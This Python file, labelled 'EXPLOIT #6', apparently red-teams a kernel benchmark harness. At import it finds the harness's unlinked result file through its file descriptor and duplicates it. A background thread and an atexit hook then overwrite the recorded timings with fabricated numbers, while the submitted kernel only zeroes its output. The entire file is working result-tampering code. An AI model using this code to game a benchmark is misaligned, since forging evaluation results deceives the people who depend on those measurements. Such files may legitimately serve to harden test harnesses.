"""
EXPLOIT #6: Background Thread + FD Overwrite
==============================================
Severity: CRITICAL

Strategy:
  Combines threading with file descriptor discovery.
  At import time, find the result file fd, dup it, then spawn a background
  thread that continuously monitors the file. After the benchmark writes results
  (detected by file size stabilizing), the thread overwrites with fake data.

  Belt-and-suspenders: also registers atexit as a fallback.

Attack surface: os.fstat() + threading + os.dup()
"""
import os
import stat
import atexit
import threading
import time
import sys

_dup_fd = None

print("[Thread+FD] Scanning for unlinked result file fd...", file=sys.stderr)

for fd_num in range(256):
    try:
        s = os.fstat(fd_num)
        if stat.S_ISREG(s.st_mode) and s.st_nlink == 0:
            _dup_fd = os.dup(fd_num)
            print(f"[Thread+FD] Found unlinked file fd={fd_num}, dup'd to fd={_dup_fd}", file=sys.stderr)
            break
    except (OSError, ValueError):
        continue


def _do_overwrite(fd, source="unknown"):
    """Overwrite result file with fake data."""
    try:
        os.lseek(fd, 0, os.SEEK_SET)
        content = b''
        while True:
            chunk = os.read(fd, 8192)
            if not chunk:
                break
            content += chunk

        indices = []
        for line in content.decode(errors='replace').split('\n'):
            parts = line.strip().split('\t')
            if len(parts) == 2 and parts[0].isdigit():
                indices.append(int(parts[0]))

        if not indices:
            return False

        os.lseek(fd, 0, os.SEEK_SET)
        os.ftruncate(fd, 0)
        fake = "event-overhead\t0.001 \u00b5s\n"
        for idx in indices:
            fake += f"{idx}\t0.33\n"
        os.write(fd, fake.encode())
        print(f"[Thread+FD] Overwrote via {source}: {len(indices)} entries", file=sys.stderr)
        return True
    except Exception as e:
        print(f"[Thread+FD] Overwrite failed ({source}): {e}", file=sys.stderr)
        return False


def _monitor_thread():
    """Background thread that waits for results to be written, then overwrites."""
    if _dup_fd is None:
        return
    fd = os.dup(_dup_fd)  # get our own copy
    last_size = 0
    stable_count = 0

    for _ in range(300):  # poll for up to 30 seconds
        time.sleep(0.1)
        try:
            s = os.fstat(fd)
            if s.st_size > last_size:
                last_size = s.st_size
                stable_count = 0
            elif s.st_size > 0:
                stable_count += 1
                if stable_count >= 5:  # size stable for 0.5s -> benchmark done
                    _do_overwrite(fd, source="thread")
                    os.close(fd)
                    return
        except Exception:
            break
    try:
        os.close(fd)
    except Exception:
        pass


if _dup_fd is not None:
    t = threading.Thread(target=_monitor_thread, daemon=True)
    t.start()
    print("[Thread+FD] Started monitor thread", file=sys.stderr)

    # Also register atexit as fallback
    def _atexit_overwrite():
        if _dup_fd is not None:
            _do_overwrite(_dup_fd, source="atexit")
            try:
                os.close(_dup_fd)
            except Exception:
                pass
    atexit.register(_atexit_overwrite)


def kernel(data):
    """Wrong kernel. Results will be overwritten by thread or atexit."""
    output, inp = data
    output.zero_()
